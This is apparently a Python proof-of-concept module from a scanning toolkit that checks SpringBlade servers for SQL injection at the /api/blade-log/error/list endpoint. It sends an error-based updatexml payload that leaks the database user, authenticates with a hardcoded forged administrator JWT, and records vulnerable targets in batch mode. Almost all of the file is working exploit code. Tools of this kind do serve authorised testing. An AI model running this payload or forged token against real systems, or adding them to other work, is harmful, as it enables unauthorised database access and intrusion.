import urllib3,requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from rich.prompt import Prompt
urllib3.disable_warnings()
class Dvb_2024_6364:
    def run(self,url):
        base_url = url + "/api/blade-log/error/list?updatexml(1,concat(0x7e,111*111,user(),0x7e),1)=1"
        header = {
            "User-Agent": self.headers['User-Agent'],
            "Blade-Auth": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwib2F1dGhfaWQiOiIiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6MTc5MTU3MzkyMiwibmJmIjoxNjkxNTcwMzIyfQ.wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A",
            "Accept-Encoding": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
        try:
            response = requests.get(base_url,headers=header,verify=self.ssl,proxies=self.proxy,timeout=10)
            if response.status_code == 500 and "12321" in response.text:
                OutPrintInfoSuc("Spring", f"目标存在SQL漏洞:{base_url}")
                if not self.batch:
                    OutPrintInfo("Spring", f"POC:\n{header}")
                else:
                    OutPutFile("spring_blade_2024_6364.txt",f"目标存在SQL漏洞: {base_url}")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Spring", "目标不SQL注入漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("Spring", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Spring", f"开始检测SpringBlade接口SQL注入漏洞...")
        self.run(url)
        if not self.batch:
            OutPrintInfo("Spring", f"SpringBlade接口SQL注入漏洞检测结束")

